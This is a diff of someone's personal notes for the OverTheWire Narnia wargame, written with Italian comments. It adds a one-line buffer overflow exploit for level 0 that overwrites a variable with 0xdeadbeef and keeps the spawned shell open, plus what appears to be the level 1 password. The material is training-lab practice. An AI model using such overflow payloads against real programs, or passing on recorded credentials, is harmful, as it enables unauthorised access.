@@ -1,7 +1,10 @@
     ssh -p 2226 narnia0@narnia.labs.overthewire.org
 
-Level0    narnia0
-Level1  
+Level0  narnia0
+        (python -c 'print "a"*20 + "\xef\xbe\xad\xde"'; cat) | ./narnia0
+        #con uno script genero la stringa per uscire dal buffer e sovrascivere la variabile successiva 20+4
+        #in più visto che la shel aquisita viene chiusa, eseguendo successivamente il comando cat questo non succede
+Level1  efeidiedae 
 level2  
 level3  
 level4  
